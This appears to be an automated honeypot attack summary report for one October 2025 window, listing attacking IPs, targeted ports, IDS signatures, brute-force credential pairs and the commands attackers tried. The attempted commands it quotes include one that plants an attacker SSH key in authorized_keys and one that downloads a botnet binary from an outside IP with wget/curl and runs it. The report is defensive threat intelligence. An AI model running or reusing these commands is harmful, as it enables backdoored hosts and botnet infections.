Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-11T14:01:28Z
**Timeframe:** 2025-10-11T13:20:01Z to 2025-10-11T14:01:28Z
**Files Used:**
- agg_log_20251011T132001Z.json
- agg_log_20251011T134001Z.json
- agg_log_20251011T140001Z.json

### Executive Summary
This report summarizes 20,465 events collected from the honeypot network. The majority of attacks were captured by the Cowrie, Dionaea, and Honeytrap honeypots. A significant portion of the traffic was directed towards SMB (port 445) and SSH (port 22). Attackers were observed attempting to install backdoors and cryptocurrency miners.

### Detailed Analysis

**Attacks by Honeypot:**
- Cowrie: 7955
- Dionaea: 4119
- Honeytrap: 2959
- Suricata: 3109
- Ciscoasa: 1805
- Heralding: 105
- Sentrypeer: 130
- Redishoneypot: 48
- Tanner: 38
- ConPot: 40
- Dicompot: 42
- Miniprint: 40
- Mailoney: 24
- H0neytr4p: 25
- Honeyaml: 15
- Adbhoney: 10
- Ipphoney: 1

**Top Attacking IPs:**
- 113.182.202.61: 3104
- 125.22.42.210: 1320
- 41.38.10.88: 584
- 81.10.42.109: 399
- 43.204.221.161: 374
- 43.227.185.238: 366
- 212.87.220.20: 210
- 150.230.252.188: 213
- 113.30.191.232: 267
- 83.118.24.18: 311
- 60.51.26.84: 366

**Top Targeted Ports/Protocols:**
- 445: 4095
- 22: 1008
- 5900: 265
- 5903: 189
- 1080: 126
- 5060: 130
- 8333: 91
- 23: 55
- 31337: 55
- 6379: 48

**Most Common CVEs:**
- CVE-2002-0013
- CVE-2002-0012
- CVE-1999-0517

**Commands Attempted by Attackers:**
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ... mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
- cat /proc/cpuinfo | grep name | wc -l
- cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- ls -lh $(which ls)
- which ls
- crontab -l
- w
- uname -m
- cat /proc/cpuinfo | grep model | grep name | wc -l
- top
- uname
- uname -a
- whoami
- lscpu | grep Model
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
- Enter new UNIX password:
- Enter new UNIX password:
- cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; curl http://94.154.35.154/arm.urbotnetisass -O; chmod +x arm.urbotnetisass; ./arm.urbotnetisass android; ...

**Signatures Triggered:**
- ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication: 1314
- ET DROP Dshield Block Listed Source group 1: 556
- ET DROP Spamhaus DROP Listed Traffic Inbound group 42: 172
- GPL INFO SOCKS Proxy attempt: 123
- ET SCAN NMAP -sS window 1024: 146
- ET SCAN MS Terminal Server Traffic on Non-standard Port: 86
- ET INFO Reserved Internal IP Traffic: 57
- ET DROP Spamhaus DROP Listed Traffic Inbound group 32: 30
- ET HUNTING RDP Authentication Bypass Attempt: 22
- ET SCAN Potential SSH Scan: 17

**Users / Login Attempts:**
- 345gs5662d34/345gs5662d34
- root/Ahgf3487@rtjhskl854hd47893@#a4nC
- root/nPSpP4PBW0
- root/LeitboGi0ro
- admin/asdfp
- vpn/Password1
- centos/987654321
- nobody/1234567890
- root/3245gs5662d34

**Files Uploaded/Downloaded:**
- 11
- fonts.gstatic.com
- css?family=Libre+Franklin...
- ie8.css?ver=1.0
- html5.js?ver=3.7.3
- icanhazip.com
- nse.html)
- arm.urbotnetisass
- arm5.urbotnetisass
- arm6.urbotnetisass
- arm7.urbotnetisass
- x86_32.urbotnetisass
- mips.urbotnetisass
- mipsel.urbotnetisass

**HTTP User-Agents:**
- *None Observed*

**SSH Clients and Servers:**
- **Clients:** *None Observed*
- **Servers:** *None Observed*

**Top Attacker AS Organizations:**
- *None Observed*

### Key Observations and Anomalies
- A significant number of commands are related to establishing a persistent SSH backdoor by adding a public key to `authorized_keys`.
- The `mdrfckr` comment in the SSH key suggests a taunt from the attacker.
- An attempt to download and execute multiple malicious binaries for different architectures (ARM, x86, MIPS) was observed, indicating a widespread campaign targeting various types of devices.
- The DoublePulsar backdoor was the most frequently triggered signature, indicating attempts to exploit the EternalBlue vulnerability.
- There is a noticeable amount of scanning activity for VNC (port 5900) and other remote access services.

This concludes the Honeypot Attack Summary Report.